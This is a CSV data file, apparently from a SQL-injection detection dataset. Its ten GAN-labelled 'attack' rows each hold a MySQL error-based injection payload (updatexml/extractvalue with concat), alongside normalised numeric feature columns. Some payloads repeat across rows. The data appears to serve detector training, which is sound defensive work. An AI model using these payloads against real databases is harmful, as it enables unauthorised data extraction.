id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000888,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.838957831855401,152.45391845703125,38.46788024902344,44.43504333496094,56.02527618408203,2.7000582218170166,42.91423034667969,20.347763061523438,0.3777793049812317,0.22400254011154175,0.2211056500673294,0.3459171652793884,0.12334338575601578,3.734915018081665,0.8973818421363831,0.9157716035842896,0.686739444732666,0.07020300626754761,0.3473079800605774,0.43248245120048523,4.284766674041748,5.944777965545654,6.813899040222168,0.41979989409446716,1.8075026273727417,-0.3413543999195099,0.446419358253479,0.6215882897377014,-0.38464272022247314,-0.05217648670077324,-0.4915482997894287,-0.44034260511398315,4.248486042022705,-0.13435009121894836,0.5097504258155823,1.7583580017089844,3.7134218215942383,1.8654552698135376,0.5412958264350891,0.58199542760849,0.33592894673347473,0.32186105847358704,0.10576970875263214,-0.35722553730010986,-0.016045108437538147,-0.06466114521026611,-0.07365594804286957,-0.11008961498737335,-0.16820351779460907,-0.3584097921848297,0.41838881373405457,-0.31879064440727234,-0.37801116704940796,0.4144156575202942,-0.4254102408885956,0.11903052777051926,0.030974728986620903,0.3722195327281952,0.3908795714378357,0.734754204750061,0.0075788237154483795,0.17545801401138306,0.9480299949645996,-0.020915109664201736,0.12054271996021271,-0.7277371883392334,0.8424804210662842,-0.10127772390842438,0.43247178196907043,0.05817658081650734,-0.7005266547203064,1.0117692947387695,0.8875715732574463,-0.42178571224212646,0.029220012947916985,0.09155060350894928,1.338103175163269,0.49643179774284363,-0.09211358428001404,-0.018058273941278458,0.17966139316558838,5.242005825042725,0.22370220720767975,-0.508882462978363,0.13324876129627228,0.7284228205680847,-0.3854581117630005,-0.3870631456375122,0.43041926622390747
GAN_000889,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.8608635627079435,151.69161987304688,43.40947341918945,39.52041244506836,55.58737564086914,3.147170066833496,46.49624252319336,20.391698837280273,0.5001268982887268,0.26353690028190613,0.18622252345085144,0.3470745086669922,0.11140785366296768,3.702849864959717,1.15071439743042,0.9026221036911011,0.5280843377113342,0.17437903583049774,0.3270586431026459,0.3498614728450775,4.262999534606934,6.346898078918457,6.118428707122803,0.6341907382011414,1.729827880859375,-0.19207817316055298,0.22682170569896698,0.6889108419418335,-0.44994184374809265,-0.023971933871507645,-0.3451141119003296,-0.4108501374721527,3.3576300144195557,0.24143311381340027,0.5814433097839355,1.6147370338439941,3.4670000076293945,1.5061675310134888,0.46034446358680725,0.6199444532394409,0.33911678194999695,0.43971875309944153,0.4163711965084076,-0.1927015632390976,-0.20683811604976654,-0.15928083658218384,-0.32072722911834717,0.08738455176353455,-0.12970523536205292,-0.3141096532344818,0.509236216545105,-0.15823565423488617,-0.4175376892089844,0.30117711424827576,-0.5580121278762817,0.3544214963912964,-0.0732707679271698,0.5695073008537292,0.538789689540863,0.5851571559906006,0.08036282658576965,0.23357675969600677,0.6766060590744019,0.2124112993478775,0.3153555989265442,-0.9231551289558411,0.662479043006897,-0.25300970673561096,0.6809239983558655,0.2850922644138336,-0.6910557150840759,0.927699863910675,1.1741933822631836,-0.2317519187927246,0.00899837538599968,0.08163363486528397,1.0874892473220825,0.3263939321041107,-0.1358628123998642,-0.07960163056850433,0.3323221206665039,5.651148796081543,0.11839722096920013,-0.41522708535194397,0.07839282602071762,0.808527410030365,-0.5388548970222473,-0.303905189037323,0.5956864356994629
GAN_000890,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000125,6.502740003285183,153.0655517578125,45.71350860595703,44.283592224121094,57.894126892089844,3.40653133392334,45.837745666503906,22.391422271728516,0.6488889455795288,0.2520415484905243,0.1786549687385559,0.34211283922195435,0.11589259654283524,3.758298397064209,1.063393235206604,1.1078664064407349,0.6883999705314636,0.26762285828590393,0.3001248240470886,0.13201545178890228,4.365946292877197,6.8700337409973145,6.555924892425537,0.46649423241615295,1.8295260667800903,-0.07386096566915512,0.4274987280368805,0.6339602470397949,-0.8355382084846497,-0.04698993265628815,-0.10392752289772034,-0.4067080318927765,3.2820751667022705,0.46245521306991577,0.6392645239830017,1.5784499645233154,3.5362699031829834,1.8136218786239624,0.5740242004394531,0.31681546568870544,0.43790555000305176,0.3322588801383972,0.31826308369636536,-0.24603532254695892,0.08663320541381836,-0.22922030091285706,-0.20369036495685577,0.11676488816738129,-0.27451708912849426,-0.34765341877937317,0.5921472311019897,-0.23864127695560455,-0.5160641670227051,0.4696218967437744,-0.2558254599571228,0.16685840487480164,0.06407713890075684,0.6953226327896118,0.4033938944339752,0.8771626353263855,0.2871847450733185,0.17779427766799927,0.8487763404846191,0.2910810708999634,0.25800636410713196,-1.0768868923187256,0.6128302216529846,-0.4985678791999817,1.0552114248275757,0.20555691421031952,-0.6653618216514587,1.230743646621704,1.444536566734314,-0.3967668116092682,-0.0005398765788413584,0.10951384156942368,1.2611912488937378,0.4012770354747772,-0.1835944503545761,-0.0864204466342926,-0.05717887729406357,5.387805461883545,0.1580994576215744,-0.5285627841949463,0.036750610917806625,0.6922152638435364,-0.18120220303535461,-0.33811843395233154,0.7151418924331665
GAN_000891,attack,error,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000127,4.641187834306569,150.28070068359375,40.663818359375,37.6190071105957,52.661949157714844,0.904915452003479,44.22223663330078,19.976633071899414,0.6160735487937927,0.2804396152496338,0.2117478996515274,0.35232043266296387,0.12126363068819046,3.748014211654663,1.2179806232452393,0.6580790281295776,0.5271974802017212,0.020221572369337082,0.42192086577415466,0.2629537582397461,4.456728935241699,5.075521945953369,6.68798303604126,0.247855082154274,1.6280624866485596,-0.17709828913211823,0.43311017751693726,0.35776057839393616,-0.19868843257427216,-0.026314351707696915,-0.6144706010818481,-0.018844416365027428,3.7624435424804688,-0.2046142816543579,0.46302396059036255,1.615082025527954,3.619433879852295,1.3556770086288452,0.6948829293251038,0.37656012177467346,0.30589139461517334,0.3225945830345154,0.023400966078042984,-0.1716490536928177,-0.183079794049263,-0.1456206887960434,0.16588015854358673,0.07697302103042603,-0.00919090211391449,-0.1802043467760086,0.3138578236103058,-0.024230584502220154,-0.21192510426044464,0.20094814896583557,-0.1741943061351776,0.3364100754261017,-0.30824846029281616,0.26272574067115784,0.49279865622520447,0.7030262351036072,-0.3400348424911499,0.13696399331092834,0.4151691794395447,-0.032442692667245865,0.13359957933425903,-0.2653714716434479,0.71000736951828,0.19804412126541138,0.20276716351509094,0.012921374291181564,-0.22502276301383972,0.2964726686477661,0.5030772686004639,-0.3823350667953491,0.00826641172170639,0.05869739130139351,0.9064726233482361,0.5424619317054749,0.0493888296186924,0.04974493756890297,-0.10411109775304794,4.534575462341309,0.28982532024383545,-0.7249194979667664,0.1040022075176239,0.814326286315918,-0.30581849813461304,-0.5339481830596924,0.3406803011894226
GAN_000892,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.612315875741459,150.4998321533203,39.5993766784668,47.87678527832031,55.80766296386719,2.1823904514312744,44.964393615722656,23.418899536132812,0.6896371245384216,0.23572410643100739,0.20146426558494568,0.3400478959083557,0.12557418644428253,3.6797733306884766,0.686704695224762,1.1805999279022217,0.7052683234214783,0.12577302753925323,0.28782474994659424,0.37858065962791443,4.225264072418213,6.106550693511963,6.99868106842041,0.7049610018730164,2.052734851837158,0.14619389176368713,0.7262629866600037,0.85685795545578,-0.28712958097457886,-0.019563725218176842,-0.2947617769241333,-0.12084990739822388,3.949622631072998,-0.06479965895414352,0.3329920470714569,2.1128628253936768,3.540480852127075,1.9074047803878784,0.7807378172874451,0.0848730206489563,0.5716943144798279,0.4399854242801666,-0.05355391651391983,-0.3459201455116272,0.047582898288965225,-0.3862821161746979,-0.12943722307682037,0.07321545481681824,-0.19729427993297577,-0.17519287765026093,0.6177390813827515,-0.23833133280277252,-0.7752804160118103,0.9075983762741089,-0.3390834927558899,0.3355551064014435,-0.2824951708316803,0.8242581486701965,0.5562598705291748,0.868547797203064,0.7039855718612671,0.48194625973701477,0.8956598043441772,0.32367169857025146,0.1909363865852356,-1.0052129030227661,0.45698535442352295,-0.2894691526889801,0.8041493892669678,0.004971172660589218,-0.376961886882782,1.0350403785705566,1.259796142578125,-0.27669358253479004,-0.007933185435831547,0.09049613028764725,1.3486698865890503,0.605436384677887,-0.17402304708957672,0.06774056702852249,-0.326253205537796,3.0169665813446045,0.3302653431892395,-0.9200217723846436,0.11871452629566193,0.803132176399231,-0.6878564953804016,-0.8455891609191895,0.8767580389976501
GAN_000893,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,6.576950911884196,153.46739196777344,37.987606048583984,48.695438385009766,54.4073486328125,2.4120633602142334,43.043235778808594,21.314992904663086,0.4602792263031006,0.2186865508556366,0.20914466679096222,0.331412136554718,0.1265478879213333,3.720452308654785,0.7602480053901672,0.886884331703186,0.6427789926528931,0.11137684434652328,0.4487210512161255,0.5031135082244873,4.052363872528076,5.5941057205200195,8.089250564575195,0.5743060111999512,2.0152852535247803,-0.1498229056596756,0.6826541423797607,0.5900677442550659,-0.4349123537540436,-0.04350820183753967,-0.5945221185684204,-0.3812424838542938,4.658266544342041,-0.039008211344480515,0.39655399322509766,1.9667991399765015,3.550856351852417,2.1772961616516113,0.5298359990119934,0.2901162803173065,0.49179506301879883,0.5566625595092773,0.14484617114067078,-0.39527153968811035,-0.02499609999358654,0.12790298461914062,-0.09922002255916595,-0.05679337680339813,-0.26278921961784363,-0.4219931662082672,0.5455377697944641,-0.5092295408248901,-0.3686988949775696,0.6524537801742554,-0.33369866013526917,0.165448397397995,-0.204263374209404,0.23626282811164856,0.626807451248169,1.023558497428894,0.22616708278656006,0.5276594161987305,1.2454192638397217,0.04610387980937958,0.15826433897018433,-0.7732735872268677,0.6751132011413574,0.06917507201433182,0.7132482528686523,-0.08487993478775024,-0.5777351260185242,1.0442945957183838,0.9304043054580688,-0.4658769965171814,0.022536154836416245,0.09797830879688263,1.639755368232727,0.5952526330947876,-0.03736952692270279,0.01654500514268875,0.12328559905290604,4.063425540924072,0.3590289354324341,-1.03556227684021,0.03795960173010826,0.7447646260261536,-0.5036284327507019,-0.5565816164016724,0.8432947993278503
GAN_000894,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R000133,6.040890063582768,149.48379516601562,43.978580474853516,40.187469482421875,56.02848434448242,3.095921754837036,49.7271614074707,21.0461368560791,0.646803081035614,0.29476436972618103,0.1786886751651764,0.35035380721092224,0.10814788937568665,3.7303829193115234,1.0539475679397583,1.1363036632537842,0.5705886483192444,0.20902284979820251,0.23579181730747223,0.3353358805179596,4.755127429962158,6.614026069641113,5.670331001281738,0.18406887352466583,1.5915483236312866,-0.16163752973079681,0.2049999088048935,0.525445818901062,-0.5923289060592651,-0.02430924028158188,-0.14923669397830963,-0.15590186417102814,2.828075885772705,0.06616725027561188,0.6115149855613708,1.5918086767196655,3.1053569316864014,1.4546877145767212,0.5513157844543457,0.5386714935302734,0.4498628079891205,0.639873743057251,0.3051868677139282,-0.12729771435260773,0.15594783425331116,-0.17285503447055817,-0.2940157651901245,-0.049981728196144104,-0.31786230206489563,-0.08427117764949799,0.40166136622428894,-0.10265721380710602,-0.4508211612701416,0.3361610770225525,-0.421584814786911,0.6127099990844727,0.0381602942943573,0.6315943002700806,0.6286381483078003,0.7057297229766846,0.20994353294372559,0.40465211868286133,0.5742820501327515,0.3595322370529175,0.27781304717063904,-0.7282981872558594,0.5398455858230591,-0.3790791928768158,0.8558608889579773,0.14854823052883148,-0.7055350542068481,0.6925732493400574,1.1605279445648193,-0.3992571532726288,-0.002160790842026472,0.10017107427120209,0.8742725253105164,0.41502055525779724,-0.1446181833744049,-0.10124649107456207,0.09201744198799133,5.995131015777588,0.34745195508003235,-0.5338841676712036,0.18463459610939026,0.7362456321716309,-0.2077491283416748,-0.2552459239959717,0.8600167036056519
GAN_000895,attack,error,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",nearest_attack_euclidean,R000136,5.448332389594132,152.69667053222656,40.27201461791992,43.32966995239258,54.91987228393555,1.3337055444717407,43.91160583496094,21.557004928588867,0.6533510088920593,0.25701120495796204,0.2194627821445465,0.3409610390663147,0.1258363127708435,3.7603256702423096,0.8874062895774841,0.9107151627540588,0.26956701278686523,0.07535295933485031,0.3189646899700165,0.493509441614151,4.417542457580566,5.513516426086426,6.301036834716797,0.47963592410087585,1.6751036643981934,-0.22749847173690796,0.5771042704582214,0.6244139671325684,-0.34605544805526733,-0.030771806836128235,-0.5222519636154175,-0.08827820420265198,3.498645782470703,-0.03436844050884247,0.3061336874961853,1.8387974500656128,3.5476176738739014,1.9319820404052734,0.6300057172775269,0.08858759701251984,0.3789522647857666,0.6594972014427185,0.052840523421764374,-0.36818253993988037,-0.1444726139307022,-0.09581238031387329,-0.03308055177330971,0.002616122830659151,-0.20005802810192108,-0.24203990399837494,0.5143409967422485,-0.3048909604549408,-0.4588747024536133,0.6263605952262878,-0.2996101975440979,0.21410375833511353,-0.07392577081918716,0.44250059127807617,0.3393554985523224,0.7858107089996338,0.39894166588783264,0.2143706977367401,0.8422061204910278,0.22256948053836823,0.22722624242305756,-0.6872571706771851,0.6688340902328491,0.012785181403160095,0.5503137111663818,-0.031097333878278732,-0.47289085388183594,0.9731866121292114,0.9207166433334351,-0.18486708402633667,0.003735957434400916,0.08253339678049088,1.2738958597183228,0.5331658720970154,-0.04540735110640526,-0.008058489300310612,-0.034721992909908295,4.365421772003174,0.3912162780761719,-0.6866211295127869,0.09289442002773285,0.824637234210968,-0.6242852807044983,-0.6627588272094727,0.7032767534255981
GAN_000896,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,5.817332506387758,145.7257537841797,47.43611526489258,39.63497543334961,56.55817413330078,1.5792686939239502,50.37128829956055,20.96611976623535,0.9321369528770447,0.3155136704444885,0.169802725315094,0.3609846830368042,0.1063556894659996,3.7218573093414307,1.4633214473724365,1.0968612432479858,0.6466503739356995,0.2045714110136032,0.24343973398208618,0.07579577714204788,4.784063816070557,6.330062389373779,5.641336441040039,0.5548191070556641,1.527018666267395,0.299754798412323,-0.014828568324446678,0.6211689710617065,-0.4494905471801758,4.883800647803582e-05,-0.18137694895267487,0.11954391002655029,2.088195323944092,0.030855584889650345,0.6443639993667603,1.5504767894744873,3.2473831176757812,1.1416302919387817,0.8584738969802856,0.005546461790800095,0.41907739639282227,0.6325438618659973,0.1227128878235817,-0.0353732593357563,0.1711173802614212,-0.190174862742424,-0.09712475538253784,0.1846129596233368,-0.08053846657276154,0.117015540599823,0.41300612688064575,0.16442960500717163,-0.441738486289978,0.4173524081707001,-0.005593501031398773,0.7843350768089294,-0.30604982376098633,0.6295858025550842,0.6073311567306519,0.6452209949493408,0.2777623236179352,0.35806453227996826,0.29409435391426086,0.13929018378257751,0.43894657492637634,-0.6598612666130066,0.32478049397468567,-0.2962726056575775,0.9020588994026184,0.06508859992027283,-0.4659973084926605,0.3538113236427307,1.23665189743042,-0.28232455253601074,-0.0050840009935200214,0.08400224894285202,0.9342004060745239,0.21257264912128448,0.017174456268548965,-0.028875257819890976,-0.18839427828788757,4.649143218994141,0.2827974557876587,-0.22633370757102966,0.2377873957157135,0.797389566898346,-0.4187978208065033,-0.3136623203754425,0.9459681510925293
GAN_000897,attack,error,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",nearest_attack_euclidean,R000096,4.960963671745564,149.98428344726562,43.72411346435547,38.56344223022461,55.635475158691406,2.248603582382202,44.18073654174805,19.918872833251953,0.6657862663269043,0.29370591044425964,0.17941142618656158,0.35403844714164734,0.11007430404424667,3.669330358505249,1.0498886108398438,0.6129790544509888,0.7577852606773376,0.17457781732082367,0.2556556165218353,0.4166133999824524,4.572206020355225,5.910439968109131,6.4487152099609375,0.3213343918323517,1.7865642309188843,-0.1973007619380951,0.2568567395210266,0.5238825082778931,-0.31772470474243164,-0.010794593021273613,-0.36396706104278564,-0.2535763680934906,2.973453998565674,-0.06977108120918274,0.5935638546943665,1.5604621171951294,3.6488730907440186,1.3037984371185303,0.7284654378890991,0.26369744539260864,0.4123988449573517,0.2921738624572754,0.09006704390048981,-0.11404865235090256,0.02472914755344391,-0.2379225641489029,-0.08651629090309143,0.05319461226463318,0.06907892227172852,-0.06939662992954254,0.4301060438156128,0.11222517490386963,-0.3884878158569336,0.43219736218452454,-0.21101191639900208,0.29638031125068665,-0.5091798901557922,0.2688208520412445,0.6239126324653625,0.18213684856891632,-0.058517247438430786,0.38521891832351685,0.23462548851966858,0.005367521196603775,0.25722113251686096,-0.6502462029457092,0.5884789228439331,-0.2650953531265259,0.25957024097442627,-0.09706167876720428,-0.5036300420761108,0.37747567892074585,0.9618203639984131,-0.48259010910987854,0.028845684602856636,0.061988465487957,0.8932633399963379,0.27338093519210815,0.09175939112901688,-0.020266149193048477,0.14081597328186035,4.672310829162598,0.003720539389178157,-0.3485952317714691,0.22178684175014496,0.7479936480522156,-0.4056089520454407,-0.38984405994415283,0.3319593667984009
